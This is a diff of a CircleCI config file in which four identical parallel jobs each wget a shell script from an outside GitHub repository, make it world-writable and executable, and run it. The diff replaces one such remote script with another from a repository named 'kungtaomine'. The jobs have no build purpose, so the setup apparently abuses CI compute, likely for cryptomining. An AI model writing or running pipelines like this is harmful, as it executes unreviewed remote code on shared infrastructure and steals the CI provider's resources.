@@ -6,34 +6,34 @@ jobs:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget https://github.com/welmii/TES/raw/main/running.sh 
-      - run: chmod 777 running.sh 
-      - run: ./running.sh
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
   gas2:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget https://github.com/welmii/TES/raw/main/running.sh 
-      - run: chmod 777 running.sh 
-      - run: ./running.sh
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
   gas3:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget https://github.com/welmii/TES/raw/main/running.sh 
-      - run: chmod 777 running.sh 
-      - run: ./running.sh
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
   gas4:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget https://github.com/welmii/TES/raw/main/running.sh 
-      - run: chmod 777 running.sh 
-      - run: ./running.sh
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: ./get2.sh
 
 # Orchestrate our job run sequence
 workflows:
-  route:
+  alp_5:
     jobs:
       - gas1
       - gas2
